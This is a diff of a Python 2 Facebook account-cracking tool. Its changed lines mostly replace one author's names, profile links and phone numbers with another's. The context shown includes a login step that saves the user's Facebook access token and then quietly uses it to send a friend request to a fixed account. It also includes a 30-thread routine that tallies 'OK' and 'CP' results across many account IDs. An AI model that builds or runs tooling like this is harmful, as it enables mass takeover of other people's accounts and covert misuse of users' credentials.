@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To Mk Tricks
+#The Credit For This Code Goes To Mansoor Khan
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 #Reserved2020
 
@@ -51,18 +51,18 @@ def jalan(z):
 #Dev:Omi_Ch
 ##### LOGO #####
 logo = """
-        \033[1;97m::::::::    :::   :::   ::::::::::: 
-      \033[1;97m:+:    :+:  :+:+: :+:+:      :+:      
-     \033[1;92m+:+    +:+ +:+ +:+:+ +:+     +:+       
-    \033[1;92m+#+    +:+ +#+  +:+  +#+     +#+        
-   \033[1;92m+#+    +#+ +#+       +#+     +#+         
-  \033[1;92m#+#    #+# #+#       #+#     #+#          
-  \033[1;92m########  ###       ### ###########
+        \033[1;97####:::::       ########           ####      ####
+      \033[1;97m####   :+:+:  ####   ####           ####    ####
+      \033[1;92m####       ####      ####           ####   ####
+      \033[1;92m####        ##       ####           ########
+      \033[1;92m####                 ####           ####    ####
+      \033[1;92m####                 ####           ####       ####
+      \033[1;92m####                 ####     ###   ####         ####
 \033[1;97m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;92m๑۩۩๑\033[1;97m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[1;97mAuthor©\033[1;97m: \033[1;92mMk Tricks
-\033[1;97mInstagram\033[1;97m: \033[1;92mhttps://www.Instagram.com/Mktracker
-\033[1;97mFacebook\033[1;97m: \033[1;92mhttps://www.facebook.com/Mktracker
-\033[1;97mWhatsapp\033[1;97m: \033[1;92m+923117675174
+\033[1;97mAuthor©\033[1;97m: \033[1;92mMansoor Khan
+\033[1;97mInstagram\033[1;97m: \033[1;92mhttps://www.Instagram.com/Man50or
+\033[1;97mFacebook\033[1;97m: \033[1;92mhttps://www.facebook.com/Man50or
+\033[1;97mWhatsapp\033[1;97m: \033[1;92m+923325439914
 \033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"""
 
 def tik():
@@ -91,10 +91,10 @@ print  """
   \033[1;91m\ \/\/ /| _|| |__| (_| (_) | |\/| | _|  
    \033[1;91m\_/\_/ |___|____|\___\___/|_|  |_|___|
 \033[1;91m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;93m๑۩۩๑\033[1;91m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[1;91mAuthor©\033[1;91m: \033[1;93mOmi Chaudhary
-\033[1;91mInstagram\033[1;91m: \033[1;93mhttps://www.Instagram.com/Mktracker
-\033[1;91mFacebook\033[1;91m: \033[1;93mhttps://www.facebook.com/Mktracker
-\033[1;91mWhatsapp\033[1;91m: \033[1;93m+923117675174
+\033[1;91mAuthor©\033[1;91m: \033[1;93mMansoor Khan
+\033[1;91mInstagram\033[1;91m: \033[1;93mhttps://www.Instagram.com/Man50or
+\033[1;91mFacebook\033[1;91m: \033[1;93mhttps://www.facebook.com/Man50or
+\033[1;91mWhatsapp\033[1;91m: \033[1;93m+923325439914
 \033[1;91m«--------------------\033[1;93m✧\033[1;91m--------------------»"""
 jalan('              \033[1;91mREAD CAREFULLY:')
 jalan("\033[1;97m   It's not in Commands Control to get a   ")
@@ -113,15 +113,15 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;96m🔐 \x1b[1;91mTool Password \x1b[1;91m»» \x1b[1;93m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:Mktricks
+            print "Logged in successfully as " + username #Dev:Man50or
 	    time.sleep(2)
             loop = 'false'
         else:
             print "\033[1;91mWrong Password"
-            os.system('xdg-open https://www.Facebook.com/Mktracker')
+            os.system('xdg-open https://www.Facebook.com/Man50or')
     else:
         print "\033[1;91mWrong Username"
-        os.system('xdg-open https://www.Facebook.com/Mktracker')
+        os.system('xdg-open https://www.Facebook.com/Man50or')
 
 def login():
 	os.system('clear')
@@ -132,7 +132,7 @@ def login():
 		os.system('clear')
 		print logo
 		jalan(' \033[1;91mWarning: \033[1;97mDo Not Use Your Personal Account' )
-		jalan('          \033[1;97mUse a Fresh Account To Login' )
+		jalan('          \033[1;97mUse a New Account To Login' )
 		print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
 		print('	   \033[1;95m【\x1b[1;95mLOGIN WITH FACEBOOK\x1b[1;95m】' )
 		print('	' )
@@ -165,7 +165,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;92mLogin Successful...'
-				os.system('xdg-open https://www.Facebook.com/Mktracker')
+				os.system('xdg-open https://www.Facebook.com/Man50or')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -417,7 +417,7 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
-	print "  \033[1;91m«---------Developed By KHAN------------»" #Dev:Mk_tricks
+	print "  \033[1;91m«---------Developed By Mansoor------------»" #Dev:Mk_tricks
 	print '\033[1;92mProcess Has Been Completed\033[1;92m....'
 	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print """
